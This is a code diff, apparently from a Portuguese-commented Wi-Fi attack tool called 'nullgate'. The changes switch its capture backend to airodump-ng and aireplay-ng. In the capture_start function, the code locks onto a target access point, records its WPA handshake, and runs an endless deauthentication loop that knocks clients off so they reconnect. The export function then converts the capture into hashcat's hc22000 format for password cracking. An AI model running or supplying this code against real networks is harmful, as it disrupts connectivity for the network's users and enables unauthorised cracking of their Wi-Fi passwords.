@@ -29,8 +29,13 @@ try:
 except OSError:
     CAPTURES = WORK
 
-_capture = {"proc": None, "started": 0, "targets": [], "iface": None,
-            "essid": None, "mode": "ativo"}
+_capture = {"proc": None, "deauth": None, "started": 0, "targets": [], "iface": None,
+            "essid": None, "mode": "ativo", "bssid": None, "ch": None}
+
+
+def _cap_file():
+    files = sorted(glob.glob(f"{WORK}/cap-*.cap"))
+    return files[-1] if files else None
 
 
 def _slug(s):
@@ -344,32 +349,38 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None):
         return {"ok": False, "error": "captura ja em andamento"}
     if not bssids:
         return {"ok": False, "error": "nenhum BSSID alvo"}
-    # filtro BPF restringindo aos APs alvo (so as redes escolhidas)
-    terms = " or ".join(f"wlan addr3 {b}" for b in bssids)
-    bpf = f"{WORK}/filter.bpf"
-    r = _sh(f'tcpdump -s 1024 -y IEEE802_11_RADIO "{terms}" -ddd > {bpf}', timeout=15)
-    if r.returncode != 0:
-        return {"ok": False, "error": "falha ao gerar filtro", "stderr": r.stderr}
-    chans = ",".join(str(c) for c in channels) if channels else "1,6,11"
-    cap = f"{WORK}/capture.pcapng"
-    try:
-        os.remove(cap)
-    except OSError:
-        pass
-    _cleanup_iface(iface)       # mata captura/ataque orfao antes de iniciar
-    _last_hs.update(ts=0, n=0)  # zera o cache de contagem
-    cmd = ["hcxdumptool", "-i", iface, "-w", cap, f"--bpf={bpf}", "-c", chans, "--rds=1"]
-    if mode == "passivo":
-        # nao envia deauth/disassoc (so escuta)
-        cmd += ["--disable_deauthentication", "--disable_disassociation"]
-    proc = subprocess.Popen(
-        cmd, stdout=open(f"{WORK}/hcx.log", "w"),
-        stderr=subprocess.STDOUT, preexec_fn=os.setsid,
+    # usa airodump-ng + aireplay-ng (funcionam no rtl8xxxu; hcxdumptool nao arma)
+    bssid = bssids[0]                       # airodump mira um AP (o alvo escolhido)
+    ch = str(channels[0]) if channels else "1"
+    for f in glob.glob(f"{WORK}/cap-*"):
+        try:
+            os.remove(f)
+        except OSError:
+            pass
+    _cleanup_iface(iface)
+    _set_monitor(iface)
+    _last_hs.update(ts=0, n=0)
+    # airodump fixo no canal/AP: captura o 4-way handshake no .cap
+    airo = subprocess.Popen(
+        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", f"{WORK}/cap",
+         "--output-format", "pcap", iface],
+        stdout=open(f"{WORK}/airo.log", "w"), stderr=subprocess.STDOUT,
+        preexec_fn=os.setsid,
     )
-    _capture.update({"proc": proc, "started": time.time(), "targets": bssids,
-                     "iface": iface, "essid": essid, "mode": mode})
+    deauth_proc = None
+    if mode == "ativo":
+        # rajadas de deauth intercaladas: derruba, pausa 6s pra reconectar e soltar o handshake
+        deauth_proc = subprocess.Popen(
+            ["bash", "-c",
+             f"while true; do aireplay-ng --deauth 4 -a {bssid} {iface} "
+             f">/dev/null 2>&1; sleep 6; done"],
+            preexec_fn=os.setsid,
+        )
+    _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
+                     "targets": bssids, "iface": iface, "essid": essid,
+                     "mode": mode, "bssid": bssid, "ch": ch})
     return {"ok": True, "msg": "captura iniciada", "iface": iface, "modo": mode,
-            "alvos": bssids, "canais": chans}
+            "alvo": bssid, "canal": ch}
 
 
 def deauth(bssid, channel, iface=None, seconds=10):
@@ -433,10 +444,9 @@ def capture_status():
     proc = _capture["proc"]
     running = bool(proc and proc.poll() is None)
     elapsed = int(time.time() - _capture["started"]) if _capture["started"] else 0
-    cap = f"{WORK}/capture.pcapng"
-    size = os.path.getsize(cap) if os.path.exists(cap) else 0
-    # tenta avaliar se ja tem handshake convertendo em memoria
-    handshakes = _count_handshakes(cap) if size > 0 else 0
+    cap = _cap_file()
+    size = os.path.getsize(cap) if cap and os.path.exists(cap) else 0
+    handshakes = _count_handshakes(cap) if cap and size > 0 else 0
     return {
         "ok": True,
         "rodando": running,
@@ -469,34 +479,39 @@ def _count_handshakes(cap, force=False):
     return n
 
 
-def capture_stop():
-    proc = _capture["proc"]
-    if proc and proc.poll() is None:
+def _kill_proc(p):
+    if p and p.poll() is None:
         try:
-            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
-            for _ in range(10):
-                if proc.poll() is not None:
+            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
+            for _ in range(8):
+                if p.poll() is not None:
                     break
                 time.sleep(0.2)
-            if proc.poll() is None:
-                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+            if p.poll() is None:
+                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
         except Exception:
             try:
-                proc.kill()
+                p.kill()
             except Exception:
                 pass
+
+
+def capture_stop():
+    _kill_proc(_capture.get("deauth"))   # para o loop de deauth
+    _kill_proc(_capture.get("proc"))     # para o airodump
+    _capture["deauth"] = None
     iface = _capture.get("iface") or DEFAULT_RADIO
-    _cleanup_iface(iface)      # mata orfaos
-    _set_managed(iface)        # volta pra managed (desemperra)
-    cap = f"{WORK}/capture.pcapng"
-    hs = _count_handshakes(cap, force=True) if os.path.exists(cap) else 0
+    _cleanup_iface(iface)      # mata orfaos (aireplay/airodump)
+    _set_managed(iface)        # volta pra managed
+    cap = _cap_file()
+    hs = _count_handshakes(cap, force=True) if cap else 0
     return {"ok": True, "msg": "captura parada", "handshakes": hs, "iface": iface}
 
 
 def export_hc22000():
-    cap = f"{WORK}/capture.pcapng"
+    cap = _cap_file()
     out = f"{WORK}/nullgate.hc22000"
-    if not os.path.exists(cap):
+    if not cap or not os.path.exists(cap):
         return {"ok": False, "error": "nada capturado ainda"}
     try:
         os.remove(out)
